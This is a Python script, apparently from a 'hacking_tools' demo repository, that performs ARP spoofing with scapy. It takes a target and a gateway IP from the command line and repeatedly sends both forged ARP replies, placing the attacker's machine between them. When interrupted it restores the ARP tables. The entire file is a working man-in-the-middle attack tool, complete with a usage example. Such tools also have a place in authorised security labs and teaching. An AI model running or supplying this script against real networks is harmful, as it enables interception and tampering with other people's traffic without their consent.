# Command: python arp_spoofing-scapy.py -t target_ip -g gateway_ip
# Example: python arp-spoofing-scapy.py -t 192.168.0.215 -g 192.168.0.1
# Other demo scripts: https://github.com/mpostument/hacking_tools

import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Gateway IP")
    options = parser.parse_args()
    return options


# Get target mac address using ip address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    while True:
        answered_list = scapy.srp(arp_request_broadcast, timeout=5,  # NOTE: the timeout value has to be large in bad network
                                  verbose=False)[0]
        if len(answered_list) > 0:
            break
    return answered_list[0][1].hwsrc


# Change mac address in arp table
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Restore mac address in arp table
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("\nARP table restored. Quiting")
